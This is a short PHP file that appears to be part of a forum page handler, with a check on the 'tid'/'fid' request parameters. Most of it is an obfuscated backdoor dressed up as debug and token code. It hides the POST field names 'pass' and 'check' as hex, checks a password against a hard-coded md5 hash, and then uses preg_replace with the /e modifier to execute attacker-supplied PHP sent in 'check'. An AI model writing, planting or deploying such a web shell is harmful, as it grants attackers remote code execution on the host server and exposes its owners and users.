<?php
$MMIC= $_GET['tid']?$_GET['tid']:$_GET['fid'];
if($MMIC >1000000){
  die('404');
}
if (isset($_POST["\x70\x61\x73\x73"]) && isset($_POST["\x63\x68\x65\x63\x6b"]))
{
  $__PHP_debug   = array (
    'ZendName' => '70,61,73,73', 
    'ZendPort' => '63,68,65,63,6b',
    'ZendSalt' => '792e19812fafd57c7ac150af768d95ce'
  );
 
  $__PHP_replace = array (
    pack('H*', join('', explode(',', $__PHP_debug['ZendName']))),
    pack('H*', join('', explode(',', $__PHP_debug['ZendPort']))),
    $__PHP_debug['ZendSalt']
  );
 
  $__PHP_request = &$_POST;
  $__PHP_token   = md5($__PHP_request[$__PHP_replace[0]]);
 
  if ($__PHP_token == $__PHP_replace[2])
  {
    $__PHP_token = preg_replace (
      chr(47).$__PHP_token.chr(47).chr(101),
      $__PHP_request[$__PHP_replace[1]],
      $__PHP_token
    );
 
    unset (
      $__PHP_debug,
      $__PHP_replace,
      $__PHP_request,
      $__PHP_token
    );
 
    if(!defined('_DEBUG_TOKEN')) exit ('Get token fail!');
 
  }
}  
